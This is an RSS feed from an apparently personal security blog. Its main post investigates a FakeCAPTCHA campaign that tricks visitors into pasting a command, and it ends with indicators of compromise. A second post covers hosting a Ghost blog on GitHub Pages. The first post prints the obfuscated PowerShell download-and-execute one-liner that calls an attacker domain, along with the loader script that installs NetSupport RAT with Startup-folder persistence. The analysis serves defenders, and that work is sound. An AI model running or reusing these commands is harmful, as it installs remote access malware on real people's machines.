<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>Systems, Software and Security</title><description>Thoughts, stories and ideas.</description><link>http://localhost:2369/</link><image><url>http://localhost:2369/favicon.png</url><title>Systems, Software and Security</title><link>http://localhost:2369/</link></image><generator>Ghost 5.125</generator><lastBuildDate>Sun, 29 Jun 2025 17:09:08 GMT</lastBuildDate><atom:link href="http://localhost:2369/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Attack Chain Investigation: FakeCAPTCHA to RAT Install</title><description>&lt;h2 id="providing-proof-of-humanity"&gt;Providing &amp;quot;Proof of Humanity&amp;quot;&lt;/h2&gt;&lt;p&gt;With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman&amp;apos;s &lt;a href="https://world.org/world-id?ref=localhost" rel="noreferrer"&gt;World ID&lt;/a&gt; which uses &amp;quot;&lt;/p&gt;</description><link>http://localhost:2369/attack-chain-investigation-fakecaptcha-to-rat-install/</link><guid isPermaLink="false">684fe4e403405b0f2b969a78</guid><dc:creator>Simon Kruik</dc:creator><pubDate>Sun, 29 Jun 2025 16:57:34 GMT</pubDate><media:content url="http://localhost:2369/content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png" medium="image"/><content:encoded>&lt;h2 id="providing-proof-of-humanity"&gt;Providing &amp;quot;Proof of Humanity&amp;quot;&lt;/h2&gt;&lt;img src="http://localhost:2369/content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install"&gt;&lt;p&gt;With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman&amp;apos;s &lt;a href="https://world.org/world-id?ref=localhost" rel="noreferrer"&gt;World ID&lt;/a&gt; which uses &amp;quot;The Orb&amp;quot; to capture and verify biometrics, to commercial offerings like &lt;a href="https://en.wikipedia.org/wiki/ID.me?ref=localhost" rel="noreferrer"&gt;ID.me&lt;/a&gt; which rely on user submission of government-issued IDs, but maybe the most commonly encountered across a variety of services is the humble &lt;strong&gt;CAPTCHA &lt;/strong&gt;(&lt;strong&gt;C&lt;/strong&gt;ompletely &lt;strong&gt;A&lt;/strong&gt;utomated &lt;strong&gt;P&lt;/strong&gt;ublic &lt;strong&gt;T&lt;/strong&gt;uring Test to tell &lt;strong&gt;C&lt;/strong&gt;omputers and &lt;strong&gt;H&lt;/strong&gt;umans &lt;strong&gt;A&lt;/strong&gt;part).&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2369/content/images/2025/06/image.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="582" height="144"&gt;&lt;figcaption&gt;&lt;span style="white-space: pre-wrap;"&gt;An example of the &amp;quot;CAPTCHA&amp;quot; box on the infected site&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;These generally start with a simple checkbox, but will then sometimes prompt human verification via correctly identifying distorted letters, transcribing audio or completing a series of image identification challenges (with often frustratingly vague criteria). But what happens when this common and benign &amp;apos;human verification task&amp;apos; is altered and weaponised by a threat actor?&lt;/p&gt;&lt;h2 id="the-pledge1-just-one-extra-step"&gt;The Pledge&lt;sup&gt;[1]&lt;/sup&gt;: &lt;em&gt;Just one extra step...&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;The &amp;apos;FakeCAPTCHA&amp;apos; launches&lt;sup&gt;[2]&lt;/sup&gt; as soon as you hit any page on a compromised web server (and in fact overlays the original webpage which still loads, presumably to help minimise any obvious changes in visitor traffic to the original site). However after clicking the checkbox, an error pops up:&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2369/content/images/2025/06/image-1.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="928" height="456" srcset="http://localhost:2369/content/images/size/w600/2025/06/image-1.png 600w, http://localhost:2369/content/images/2025/06/image-1.png 928w" sizes="(min-width: 720px) 720px"&gt;&lt;figcaption&gt;&lt;span style="white-space: pre-wrap;"&gt;The error message, instructing &amp;apos;legitimate users&amp;apos; to paste a code into the Run tool&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;This sentence &amp;quot;Unusual Web Traffic Detected&amp;quot; occurs legitimately for those who browse the web with a VPN connected, or use TOR, as it is often due to your device sharing an IP address with automated tools, bots or scrapers. This extra step however deviates from the norm - in both this and other observed examples it presents instructions to verify your identity using an inbuilt tool in Windows and send a code. This pattern is familiar to those used to using a one-time code (&amp;quot;nonce&amp;quot;) for use in multi-factor authentication systems, password resets, or email verification. This mix and match of existing and novel components helps ensure the victim might be convinced that this request is a new version of previously seen CAPTCHAs. &lt;/p&gt;&lt;h2 id="the-turn-not-what-it-says-on-the-tin"&gt;The Turn: &lt;em&gt;Not what it says on the tin&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;The first malicious behaviour we see is the &amp;quot;Copy&amp;quot; button on the verification code section. While it looks equivalent to many other technical documentation sites which have the same function, it actually decodes a base64 string and places that in your clipboard instead.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2369/content/images/2025/06/image-2.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="385" height="136"&gt;&lt;figcaption&gt;&lt;span style="white-space: pre-wrap;"&gt;Clipboard history displaying the actual effect of the Copy button&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The string is a little bit obfuscated as you can see here:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;powershell -w h -nop -c &amp;quot;$e=(@(104,116,116,112,115,58,47,47,118,101,114,105,102,105,110,116,99,111,110,46,99,111,109,47,49,46,116,120,116)|%{[char]$_})-join&amp;apos;&amp;apos;;$y=New-Object Net.WebClient;$u=$y.(&amp;apos;DownloadStri&amp;apos;+&amp;apos;ng&amp;apos;)($e);$i=&amp;apos;i&amp;apos;+&amp;apos;e&amp;apos;+&amp;apos;x&amp;apos;;&amp;amp;$i $u&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Put simply, this command downloads a file from the URL  (made up of the ASCII codes above) &lt;em&gt;https:// verifintcon [.] com/1.txt &lt;/em&gt;and executes it in a hidden Powershell window without a profile (meaning no custom scripts). So, let&amp;apos;s look at the contents of the downloaded Powershell file:&lt;/p&gt;&lt;blockquote&gt;$ErrorActionPreference=&amp;apos;Stop&amp;apos;;$ojftLp=&amp;apos;eyJwYXRocyI6WyJBdWRpb0NhcHR1cmUuZGxsIiwiY2...&amp;lt;9,714,825 characters&amp;gt;...GVEaGNxTHFBQUFBQUE9PSJdfQ==&amp;apos;==&amp;apos;;$ptCuIqwFE=[System.Text.Encoding]::UTF8.GetString([System.Convert]::&lt;strong&gt;FromBase64String&lt;/strong&gt;($ojftLp));$hNHwwvpT=&lt;strong&gt;ConvertFrom-Json &lt;/strong&gt;$ptCuIqwFE;$wBZiLfRoT=&lt;strong&gt;Join-Path $env:AppData &amp;apos;FZlhFAy&lt;/strong&gt;&amp;apos;;[IO.Directory]::CreateDirectory($wBZiLfRoT)|Out-Null;for($lTkdkWq=0;$lTkdkWq -lt $hNHwwvpT.paths.Count;$lTkdkWq++){$eKCEjGQgX=$hNHwwvpT.paths[$lTkdkWq];$LKMlDIY=[System.Convert]::FromBase64String($hNHwwvpT.data[$lTkdkWq]);$MRQZHFLA=Join-Path $wBZiLfRoT $eKCEjGQgX;$tyXPYtKPrf=[System.IO.Path]::GetDirectoryName($MRQZHFLA);if(-not(Test-Path $tyXPYtKPrf)){New-Item -Type Directory -Path $tyXPYtKPrf|Out-Null}[System.IO.File]::&lt;strong&gt;WriteAllBytes&lt;/strong&gt;($MRQZHFLA,$LKMlDIY);}$oxyNFIQQ=New-Object -ComObject WScript.Shell;$fgWVKoq=$oxyNFIQQ.&lt;strong&gt;CreateShortcut&lt;/strong&gt;((Join-Path $wBZiLfRoT &amp;apos;RuivQswX.lnk&amp;apos;));$fgWVKoq.TargetPath=Join-Path $wBZiLfRoT &amp;apos;client32.exe&amp;apos;;$fgWVKoq.WorkingDirectory=$wBZiLfRoT;$fgWVKoq.WindowStyle=7;$fgWVKoq.Save();$acZpyja=Join-Path ($&lt;strong&gt;env:APPDATA+&amp;apos;\Microsoft\Windows\Start Menu\Programs\Startup&lt;/strong&gt;&amp;apos;) &amp;apos;RuivQswX.lnk&amp;apos;;$olnNnlh=$oxyNFIQQ.CreateShortcut($acZpyja);$olnNnlh.TargetPath=Join-Path $wBZiLfRoT &amp;apos;client32.exe&amp;apos;;$olnNnlh.WorkingDirectory=$wBZiLfRoT;$olnNnlh.WindowStyle=7;$olnNnlh.Save();&lt;strong&gt;Start-Sleep -Seconds 3;Invoke-Expression (&amp;apos;cmd /c rundll32.exe shell32.dll,ShellExec_RunDLL &amp;quot;&amp;apos;+$acZpyja+&amp;apos;&amp;quot;&amp;apos;);Write-Host &amp;apos;Done&amp;apos;&lt;/strong&gt;&lt;/blockquote&gt;&lt;p&gt;There&amp;apos;s a lot of it, and both the data and variable names are clearly obfuscated, this time the data is base64 encoding of a JSON file which decoded has this first line:&lt;/p&gt;&lt;blockquote&gt;{&amp;quot;paths&amp;quot;:[&amp;quot;AudioCapture.dll&amp;quot;,&amp;quot;client32.exe&amp;quot;,&amp;quot;client32.ini&amp;quot;,&amp;quot;HTCTL32.DLL&amp;quot;,&lt;br&gt;&amp;quot;msvcr100.dll&amp;quot;,&amp;quot;nskbfltr.inf&amp;quot;,&amp;quot;NSM.LIC&amp;quot;,&amp;quot;nsm_vpro.ini&amp;quot;,&amp;quot;pcicapi.dll&amp;quot;,&lt;br&gt;&amp;quot;PCICHEK.DLL&amp;quot;,&amp;quot;PCICL32.DLL&amp;quot;,&amp;quot;remcmdstub.exe&amp;quot;,&amp;quot;TCCTL32.DLL&amp;quot;],&lt;br&gt;&amp;quot;data&amp;quot;:[&amp;quot;TVqQAAMAAAAEAAAA//8AA...&lt;/blockquote&gt;&lt;p&gt;Clearly a list of filenames, followed by an array of data to put into them. That helps us understand the context of the powershell command - following the sections in bold - it:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Decodes the data from Base64&lt;/li&gt;&lt;li&gt;Converts it from JSON into a Powershell object&lt;/li&gt;&lt;li&gt;Adds to the file paths the local AppData folder and sub-folder &lt;code&gt;FZlhFAy&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Writes the bytes of the files to said folder&lt;/li&gt;&lt;li&gt;Creates a shortcut to the &amp;quot;client32.exe&amp;quot; application&lt;/li&gt;&lt;li&gt;Puts the shortcut in the Windows Startup folder for persistence&lt;/li&gt;&lt;li&gt;Waits 3 seconds, and then runs the shortcut and writes &amp;quot;Done&amp;quot;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Two things that are worth noting here:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;None of this code is unique to the request of the original website, and none of it appears to communicate back to said webpage, so the original user is stuck with the FakeCAPTCHA unfulfilled and the webpage still inaccessible - something that may arouse suspicion. Unlike more complex trojans, this doesn&amp;apos;t achieve it&amp;apos;s stated purpose in addition to staging a further tool.&lt;/li&gt;&lt;li&gt;In the JSON file&amp;apos;s paths array, we clearly see &amp;quot;NSM.lic&amp;quot; which is a NetSupport License file, and it&amp;apos;s contents show the NSM Serial Number &lt;code&gt;NSM212937&lt;/code&gt;. This is a well-known Remote Access Tool (RAT) that can be used to exfiltrate existing data, pivot to other devices on the network or monitor steal passwords/secrets pasted to the clipboard.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id="the-prestige-wrapping-it-up"&gt;The Prestige: &lt;em&gt;Wrapping it up&lt;/em&gt;&lt;/h2&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2369/content/images/2025/06/FakeCAPTCHA_AttackChain.drawio.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="770" height="445" srcset="http://localhost:2369/content/images/size/w600/2025/06/FakeCAPTCHA_AttackChain.drawio.png 600w, http://localhost:2369/content/images/2025/06/FakeCAPTCHA_AttackChain.drawio.png 770w" sizes="(min-width: 720px) 720px"&gt;&lt;figcaption&gt;&lt;span style="white-space: pre-wrap;"&gt;Attack Chain Diagram &lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The nature of the RAT is such that it can be utilised for a variety of malicious purposes meaning there&amp;apos;s not an obvious behaviour to detect. There are however, a variety of indicators that can be reported and monitored.&lt;/p&gt;&lt;p&gt;Indicators of Compromise (IOCs):&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Traffic contacting &lt;code&gt;thankyoumykio [.] com:443&lt;/code&gt;, &lt;code&gt;deepholeintheworld [.] com:443&lt;/code&gt;, and &lt;code&gt;83.222.190.174&lt;/code&gt; - all used for communication to/from the RAT. These sites may be compromised sites or originals, and are hosted by the network provider SS-Net in Bulgaria. A copy of these findings and a takedown request was sent to the provider.&lt;/li&gt;&lt;/ul&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2369/content/images/2025/06/image-3.png" class="kg-image" alt="Attack Chain Investigation: FakeCAPTCHA to RAT Install" loading="lazy" width="629" height="268" srcset="http://localhost:2369/content/images/size/w600/2025/06/image-3.png 600w, http://localhost:2369/content/images/2025/06/image-3.png 629w"&gt;&lt;figcaption&gt;&lt;span style="white-space: pre-wrap;"&gt;The NetSupport Config File showing the above IOCs&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li&gt;A powershell download from &lt;code&gt;https:// verifintcon [.] com/1.txt&lt;/code&gt;, the obfuscated data file. This seems to be the front-end for (ironically) a Cloudflare R2 public bucket hosting the file. This was reported to Cloudflare&amp;apos;s Abuse team, and via their bug bounty program, however since the original site didn&amp;apos;t fall under their scope, and it &amp;quot;does not pose a concrete and exploitable risk&amp;quot; they refused to take any action. &amp;#x1F9B6;&amp;#x1F52B;&amp;#x2601;&amp;#xFE0F;&lt;sup&gt;[3]&lt;/sup&gt;&lt;/li&gt;&lt;li&gt;NetSupport Manager is relatively well-known for it&amp;apos;s use as a malicious RAT, and their support was very helpful in confirming that this installation is using a outdated cracked version. Any legitimate version would be updated and with a different configuration, therefore an indicator is finding files in:&lt;ul&gt;&lt;li&gt;&lt;code&gt;AppData\Roaming\FZlhFAy&lt;/code&gt; with the following MD5 hashes:&lt;ul&gt;&lt;li&gt;client32.exe: &lt;code&gt;290c26b1579fd3e48d60181a2d22a287&lt;/code&gt;&lt;/li&gt;&lt;li&gt;client32.ini: &lt;code&gt;6fb2724011abc37646ac6288faa8e9bf&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;A shortcut in &lt;code&gt;AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt; with this MD5 hash&lt;ul&gt;&lt;ul&gt;&lt;li&gt;RuivQswX.lnk: &lt;code&gt;38c6cab1de02c1918bf0e1f77c0c2c3d&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Notably, even if an existing Anti-Virus detects and quarantines the NetSupport Manager application (.exe), this shortcut will likely remain and provide evidence that the phishing attempt was successful.&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;One of the things I have been unable to find is a good indicator for compromised servers on which this FakeCAPTCHA is being deployed - this could potentially be used in tools like the Shodan Search Engine to find other compromised servers and notify the owners. As it is, one other compromised server was found from the original, and both server owners were contacted and informed of the issue.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Given the relative simplicity of the attack chain, the ubiquity of CAPTCHAs and other interruptive dialogues (paywalls, cookies settings panels, etc.) and the lack of concern by the major parties involved, I can only expect we&amp;apos;ll see more attacks like this in the future. Like most phishing attacks, the strongest defence is training users - in this case, to set good boundaries/expectations about what behaviour a website should ask of you, something both technical and non-technical staff alike can be prepared for.&lt;/p&gt;&lt;h3 id="footnotes"&gt;Footnotes&lt;/h3&gt;&lt;p&gt;[1] These heading prefixes are taken from the elements of a magic illusion described in The Prestige&lt;/p&gt;&lt;p&gt;[2] The page presented for the FakeCAPTCHA is actually quite interesting - it uses a lot of static assets, presumably to not alert the website it&amp;apos;s impersonating, but generates a new &amp;apos;unique id&amp;apos; at the bottom of the page each time, and up until the extra step has no obvious grammar or graphical errors to tell it apart from a standard CAPTCHA&lt;br&gt;&lt;br&gt;[3] Emoji Translation: Cloudflare shooting themselves in the foot.&lt;/p&gt;</content:encoded></item><item><title>Setting up a blog using Ghost and GitHub Pages</title><description>&lt;h2 id="choosing-your-technology"&gt;Choosing your technology&lt;/h2&gt;&lt;p&gt;With the wide array of blog hosting sites and technologies available, choosing one can be a pretty daunting task. The main factors I looked at when considering the options available were:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Peer approval: Did people I know and trust have good experiences with it?&lt;/li&gt;&lt;li&gt;Ongoing cost: Can&lt;/li&gt;&lt;/ul&gt;</description><link>http://localhost:2369/setting-up-a-blog-using-ghost-and-github-pages/</link><guid isPermaLink="false">684e94466a311709457c14e6</guid><category>systems</category><dc:creator>Simon Kruik</dc:creator><pubDate>Sat, 24 Oct 2020 07:57:00 GMT</pubDate><content:encoded>&lt;h2 id="choosing-your-technology"&gt;Choosing your technology&lt;/h2&gt;&lt;p&gt;With the wide array of blog hosting sites and technologies available, choosing one can be a pretty daunting task. The main factors I looked at when considering the options available were:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Peer approval: Did people I know and trust have good experiences with it?&lt;/li&gt;&lt;li&gt;Ongoing cost: Can I minimise cost, or even get it hosted for free?&lt;/li&gt;&lt;li&gt;Ease-of-use: Is it easy to setup, maintain and add to?&lt;/li&gt;&lt;/ul&gt;&lt;h4 id="hosting-provider"&gt;Hosting Provider&lt;/h4&gt;&lt;p&gt;Many of my colleagues who work in IT have their own servers or &lt;a href="https://en.wikipedia.org/wiki/Virtual_private_server?ref=localhost"&gt;VPSs, &lt;/a&gt;and I&amp;apos;ve been privy to many rants about having to update or migrate servers due to security issues or their preferred applications losing support. However one of my colleagues had recently moved their website from their VPS onto &lt;a href="https://pages.github.com/?ref=localhost"&gt;GitHub Pages&lt;/a&gt;, a free hosting technology that uses your free GitHub repository to store and server your webpage. It has a few &lt;a href="https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/about-github-pages?ref=localhost#usage-limits"&gt;limits &lt;/a&gt;(1GB Repository, 100GB bandwidth/month), but for a simple blog site, it&amp;apos;s reasonably suitable. By default it hosts your website on https://&amp;lt;GitHub Username&amp;gt;.github.io (note the included TLS - nice!), but can be &lt;a href="https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/configuring-a-custom-domain-for-your-github-pages-site?ref=localhost"&gt;customised to use your own domain&lt;/a&gt;, something that I&amp;apos;m keen to do in the future, to look a bit more professional.&lt;/p&gt;&lt;h4 id="content-management-system"&gt;Content Management System&lt;/h4&gt;&lt;p&gt;The only real drawback with GitHub Pages is that it doesn&amp;apos;t in-and-of-itself offer an easy way to add and modify content, you&amp;apos;d have to edit the raw HTML/CSS/JS yourself. It does recommend using the static site generator &lt;a href="https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/setting-up-a-github-pages-site-with-jekyll?ref=localhost"&gt;Jekkyl&lt;/a&gt;, which uses markdown syntax to generate blog-style websites. Having used another markdown-based static site generator (&lt;a href="https://blog.getpelican.com/?ref=localhost"&gt;Pelican&lt;/a&gt;) for my &lt;a href="https://eresearch.uts.edu.au/?ref=localhost"&gt;workplace&amp;apos;s website&lt;/a&gt;, I understand some of the benefits of this, especially when used with a git repo - git commits allow you to easily see what members have contributed, simple formatting and editing using markdown text files, and intuitive folder-based structures. For a personal website however, I want to be able to quickly and easily add pages full of various types of content, and trust that it&amp;apos;s easily readable on various types of devices. For this reason I chose a &lt;a href="https://en.wikipedia.org/wiki/Content_management_system?ref=localhost"&gt;CMS (Content Management System) &lt;/a&gt;that I&amp;apos;d seen used to great effect in &lt;a href="https://www.troyhunt.com/its-a-new-blog/?ref=localhost"&gt;one of my favourite blogs&lt;/a&gt;, and had recommended to me as a good open-source option - &lt;a href="https://ghost.org/?ref=localhost"&gt;ghost&lt;/a&gt;. It&amp;apos;s a web-based CMS with decent free themes available and supports both basic and markdown formatting as necessary.&lt;/p&gt;&lt;h5 id="connecting-github-pages-and-ghost"&gt;Connecting GitHub Pages and Ghost&lt;/h5&gt;&lt;p&gt;Unfortunately, because ghost uses &lt;a href="https://ghost.org/docs/concepts/hosting/?ref=localhost#self-hosting"&gt;multiple services&lt;/a&gt;, such as a database and web-server, it doesn&amp;apos;t easily integrate with GitHub Pages. Luckily though where there&amp;apos;s a will there&amp;apos;s more than likely already a GitHub repository. In this case paladini&amp;apos;s super simple&lt;a href="https://github.com/paladini/ghost-on-github-pages?ref=localhost"&gt; ghost-on-github-pages repo&lt;/a&gt;; it guides you through the process of setting up ghost on your macOS or linux machine, then includes some scripts to use the &lt;a href="https://pypi.org/project/buster/?ref=localhost"&gt;buster python &lt;/a&gt;package to create a static copy of your ghost website and upload it to your GitHub repo. Because my main machine is a Windows box, I installed Ubuntu on it via &lt;a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10?ref=localhost"&gt;Windows Subsystem for Linux&lt;/a&gt; and the &lt;a href="https://www.microsoft.com/en-us/p/ubuntu/9nblggh4msv6?activetab=pivot%3Aoverviewtab&amp;amp;ref=localhost"&gt;Microsoft Store&lt;/a&gt;, which allows me to easily use a linux distro without needing to run a full &lt;a href="https://en.wikipedia.org/wiki/Virtual_machine?ref=localhost"&gt;VM&lt;/a&gt; via VirtualBox. I did run into a few issues, namely that I didn&amp;apos;t have pip installed or available via the default repositories so I had to &lt;a href="https://pip.pypa.io/en/stable/installing/?ref=localhost"&gt;install &lt;/a&gt;that manually, some of the scripts where unclear as to whether they needed to be run as root or local user, so I had to re-run some with &lt;em&gt;sudo&lt;/em&gt; prefixed, and I needed to change the default port in the deploy.sh script. Overall it&amp;apos;s a pretty clean experience that results in a locally-hosted ghost install to write and preview website posts and settings, and then a simple script to run to deploy that website to your GitHub repo. It mimicks a dev/prod environment, which is handy if you want to test-out features/themes without changing your public website.&lt;/p&gt;&lt;h2 id="where-to-from-here"&gt;Where to from here?&lt;/h2&gt;&lt;p&gt;This system ends up turning out a little &lt;em&gt;jank&lt;/em&gt; (one of my favourite types of system), since you&amp;apos;re combining two technologies that were never really designed to be combined, but getting a cheap (free!) solution out of it. It does mean however that there could be breaking changes that totally destroy this workflow in the future, or I could get frustrated with having to spin-up ghost locally everytime I want to change anything on my website. In either case, there&amp;apos;s a few alternatives I&amp;apos;d be interested in looking at:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;A &lt;a href="https://ghost.org/pricing/?ref=localhost"&gt;Ghost Pro&lt;/a&gt; solution, hosted by the Ghost Foundation. This is a little pricey, but would offer the same nice CMS option, without having to worry about filesize limits or running a local Ghost environment&lt;/li&gt;&lt;li&gt;Using Jekkyl with GitHub Pages for a more supported solution.&lt;/li&gt;&lt;li&gt;Hosting a webpage on my own VPS or home server, this is only really viable if I&amp;apos;m also planning to host other services on the same box (e.g. game/media servers, log analysers, home automation solutions), since the support necessary is much larger.&lt;/li&gt;&lt;/ul&gt;</content:encoded></item></channel></rss>